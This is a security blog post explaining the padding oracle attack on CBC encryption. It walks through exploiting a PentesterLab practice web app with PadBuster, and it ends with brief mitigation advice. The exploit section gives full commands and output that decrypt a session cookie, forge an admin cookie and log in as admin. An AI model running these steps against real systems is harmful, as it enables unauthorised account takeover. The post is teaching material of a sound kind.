---
title: "Padding Oracle Exploit in ASP.NET"
author: "Matt Keeley"
date: 2021-03-10
categories:
  - blog
tags:
  - padding oracle
  - exploit
  - cryptography
  - Cipher Block Chaining (CBC)
---

<h1>Introduction</h1>

The padding oracle attack allows an attacker to decrypt encrypted data without knowledge of the encryption key and used cipher by sending skillfully manipulated ciphertexts to the padding oracle and observing of the results returned by it. This is similar to another blog post I helped out with and can be found here. In this post I’m going to walk though the theory behind this attack and how to perform it if you find it in the wild. This issue keeps popping up in the wild so I figured I would show to to pull off this type of attack. Lets get started!






<h1>Cipher Block Chaining (CBC)</h1>

CBC is an encryption mode in which the message is split into blocks of X bytes length and each block is XORed with the previous encrypted block. The result is then encrypted.

The following schema (source: Wikipedia) explains this method:
file:///home/mkeeley/Documents/AZSERG/AZSERG.github.io/assets/2021-03-10-padding-oracle-aspnet.md/1.png

During the decryption, the reverse operation is used. The encrypted data is split in block of X bytes. Then the block is decrypted and XORed with the previous encrypted block to get the cleartext. The following schema (source: Wikipedia) highlights this behavior:

file:///home/mkeeley/Documents/AZSERG/AZSERG.github.io/assets/2021-03-10-padding-oracle-aspnet.md/image.png


Since the first block does not have a previous block, an initialization vector (IV) is used.



<h1>Theory</h1>

Credit here to PentesterLabs! They give an amazing explanation on the theory behind this attack:
When an application decrypts encrypted data, it will first decrypt the data; then it will remove the padding. During the cleanup of the padding, if an invalid padding triggers a detectable behavior, you have a padding oracle. The detectable behavior can be an error, a lack of results, or a slower response. If you can detect this behavior, you can decrypt the encrypted data and even re-encrypt the cleartext of your choice.

If we zoom in, we can see that the cleartext byte C15 is just a XOR between the encrypted byte E7 from the previous block, and byte I15 which came out of the block decryption step:

file:///home/mkeeley/Documents/AZSERG/AZSERG.github.io/assets/2021-03-10-padding-oracle-aspnet.md/image-1.png

This is also valid for all other bytes:

file:///home/mkeeley/Documents/AZSERG/AZSERG.github.io/assets/2021-03-10-padding-oracle-aspnet.md/image-4-edited.png


Now if we modify **E7** and keep changing its value, we will keep getting an invalid padding. Since we need **C15** to be **\x01**. However, there is one value of **E7** that will give us a valid padding. Let’s call it **E’7**. With **E’7**, we get a valid padding.

Since we know we get a valid padding we know that **C’15** (as in **C15** for **E’7**) is **\x01**.

file:///home/mkeeley/Documents/AZSERG/AZSERG.github.io/assets/2021-03-10-padding-oracle-aspnet.md/image-3-edited.png

Now that we have C15, we can move to brute-forcing C14. First we need to compute another E7 (let’s call it E”7) that gives us C15 = \x02. We need to do that since we want the padding to be \x02\x02 now. It’s really simple to compute using the property above and by replacing the value of C15 we want (\x02) and I15 we now know:


file:///home/mkeeley/Documents/AZSERG/AZSERG.github.io/assets/2021-03-10-padding-oracle-aspnet.md/image-2-edited.png

Using this method, we can keep going until we get all the ciphertext decrypted

<h1>Performing The Exploit</h1>
Okay, some of you probably just skipped to this part because lets be honest, you didn’t come here to learn a bunch of theory behind cryptology so Ill get right to it. To demonstration this vulnerability, I setup a web application lab on my home server provided by PentesterLabs(DM and Ill send you the zip). I then registered an account on the web server and attempted to login with the credentials: MattKeeley:MattsSecretPassword

```html
POST /login.php
HTTP/1.1 Host: 192.168.134.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.134.129/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close
Upgrade-Insecure-Requests: 1


 username=MattKeeley&password;=MattsSecretPassword

```

```html
HTTP/1.1 302 Found
Date: Fri, 24 Jul 2020 12:25:42 GMT
Server: Apache/2.2.21 (Unix) DAV/2 PHP/5.4.3
X-Powered-By: PHP/5.4.3
Set-Cookie: auth=ajjpZSp0uZxPVZRp33L2YfC8tMnXvR94
Location: /index.php
Content-Length: 778
Connection: close
Content-Type: text/html

…omitted for brevity…```

There is a tool built into Kali Linux called PadBuster that we are going to use to decrypt the encryption. The following command is used to generate response signatures:

```bash
root@warmachine:~# padbuster http://URL/login.php ajjpZSp0uZxPVZRp33L2YfC8tMnXvR94 8 --cookies auth=ajjpZSp0uZxPVZRp33L2YfC8tMnXvR94 --encoding 0
+-------------------------------------------+
| PadBuster - v0.3.3 |
| Brian Holyfield - Gotham Digital Science |
| labs@gdssecurity.com |
+-------------------------------------------+



INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1530

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided…starting response analysis

*** Response Analysis Complete ***```

The following response signatures were returned:

```bash
ID# Freq Status Length Location
1 1 200 1677 N/A
2 ** 255 200 15 N/A
Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2
[+] Success: (18/256) [Byte 8]
[+] Success: (34/256) [Byte 7]
[+] Success: (253/256) [Byte 6]
[+] Success: (237/256) [Byte 5]
[+] Success: (238/256) [Byte 4]
[+] Success: (118/256) [Byte 3]
[+] Success: (180/256) [Byte 2]
[+] Success: (233/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 4f559469df72f661
[+] Intermediate Bytes (HEX): 1f4b8c171700dcef
[+] Plain Text: user=tes

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, line 1.
*** Starting Block 2 of 2 ***
[+] Success: (153/256) [Byte 8]
[+] Success: (13/256) [Byte 7]
[+] Success: (138/256) [Byte 6]
[+] Success: (36/256) [Byte 5]
[+] Success: (149/256) [Byte 4]
[+] Success: (107/256) [Byte 3]
[+] Success: (171/256) [Byte 2]
[+] Success: (205/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): f0bcb4c9d7bd1f78
[+] Intermediate Bytes (HEX): 3b52936ed875f166
[+] Plain Text: t
** Finished ***


[+] Decrypted value (ASCII): user=test
[+] Decrypted value (HEX): 757365723D7465737407070707070707
[+] Decrypted value (Base64): dXNlcj10ZXN0BwcHBwcHBw==
```

Now that we have our proof of concept for this vulnerability, we can take this a step further and create a cookie for any username of our choice. For this example, the goal is to create a auth token for the admin user and login. To do this we will run PadBuster again but add a slight modification to the payload:

```bash
root@warmachine:~# padbuster http://URL/login.php ajjpZSp0uZxPVZRp33L2YfC8tMnXvR94 8 --cookies auth=ajjpZSp0uZxPVZRp33L2YfC8tMnXvR94 --encoding 0 --plaintext user=admin
+-------------------------------------------+
| PadBuster - v0.3.3 |
| Brian Holyfield - Gotham Digital Science |
| labs@gdssecurity.com |
+-------------------------------------------+
…omitted for brevity…

** Finished ***
[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA```

Now that we have this auth token, we can use it to login to the admin account!!


```html
GET /index.php HTTP/1.1
Host: 192.168.134.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://burp/
Cookie: auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
Connection: close
Upgrade-Insecure-Requests: 1
RESPONSE
HTTP/1.1 200 OK
Date: Fri, 24 Jul 2020 12:44:15 GMT
Server: Apache/2.2.21 (Unix) DAV/2 PHP/5.4.3
X-Powered-By: PHP/5.4.3
Content-Length: 1187
Connection: close
Content-Type: text/html

…omitted for brevity…

**You are currently logged in as admin!**
```

<h1>Is this found in the wild?</h1>
Well duh! In the past 3 months I have found this issue twice within some pretty big companies environments. That being said, this vulnerability is still very relevant today! If you’re interested in some writeups that were recently(last 3 years) posed on Hackerone you can find them here and here. Writing this code correctly is very hard, even for experts. For example, in one instance experts have introduced a severe form of this vulnerability while attempting to patch the code to eliminate it.

It is also pretty difficult to identify these vulnerabilities since a lot of times you can only see them under close observation under specific conditions.

<h1>How do I fix this issue?</h1>
The easiest and best response to this question, DONT USE CBC! There are plenty of alternatives that use the same block sizes and will not mess up your code.